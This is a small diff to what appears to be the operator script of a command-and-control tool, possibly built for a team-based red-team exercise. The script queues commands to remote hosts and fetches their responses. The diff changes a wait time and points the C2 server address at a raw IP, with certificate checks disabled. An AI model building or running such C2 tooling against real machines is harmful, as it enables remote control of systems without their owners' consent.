@@ -45,7 +45,7 @@ def sendAndReceive(host, command):
     cmd_id = addCommand(host, command)
     if not cmd_id:
         return None
-    time.sleep(5)
+    time.sleep(15)
     print(f"\nHost: {host} \n\tCommand: {command} \n\tResponse: {getResponse(host, cmd_id)}")
 
 def getCheckInTimes():
@@ -64,7 +64,7 @@ def init():
     Sets variables for server IP, list of hosts, and number of teams
     """
     global SERVER_IP
-    SERVER_IP = "https://c2.drewyoung.gay:443"
+    SERVER_IP = "https://129.21.21.74:443"
     server_info = requests.post(f'{SERVER_IP}/api/getServerInfo', json={}, verify=False).json()
     global TEAMS
     TEAMS = int(server_info['teams']) #number of teams
